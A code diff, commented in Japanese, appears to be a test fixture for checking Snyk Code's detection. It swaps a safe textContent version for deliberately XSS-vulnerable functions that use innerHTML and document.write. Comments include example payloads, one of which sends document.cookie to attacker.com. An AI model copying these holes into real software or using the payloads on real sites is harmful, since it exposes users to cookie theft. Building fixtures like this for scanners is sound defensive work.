@@ -1,19 +1,26 @@
-// 検証用：XSS（クロスサイトスクリプティング）の例（修正済み）
-// 修正内容：innerHTML の代わりに textContent を使用。
+// 検証用：XSS（クロスサイトスクリプティング）の例
+// このファイルは Snyk Code の検出検証専用です。本番利用禁止。
+// 危険な理由：ユーザー入力を innerHTML に直接代入すると、悪意あるスクリプトが実行される。
 
 'use strict';
 
-// textContent はHTMLとして解釈されないため XSS を防ぐ
+// ❌ 危険：ユーザー入力を innerHTML に直接代入
 function renderUserContent(userInput) {
-  const div = { textContent: '' };
-  div.textContent = userInput;
-  return div;
+  // 攻撃例: userInput = "<img src=x onerror='alert(document.cookie)'>"
+  document.getElementById('content').innerHTML = userInput;
 }
 
-function renderFromUrl(urlParam) {
-  const container = { textContent: '' };
-  container.textContent = '検索結果：' + urlParam;
-  return container;
+// ❌ 危険：URLパラメータをそのまま表示
+function renderFromUrl() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const name = urlParams.get('name');
+  // 攻撃例: ?name=<script>fetch('https://attacker.com?c='+document.cookie)</script>
+  document.getElementById('greeting').innerHTML = '検索結果：' + name;
 }
 
-module.exports = { renderUserContent, renderFromUrl };
+// ❌ 危険：document.write() でユーザー入力を出力
+function writeUserData(data) {
+  document.write('<div>' + data + '</div>');
+}
+
+module.exports = { renderUserContent, renderFromUrl, writeUserData };
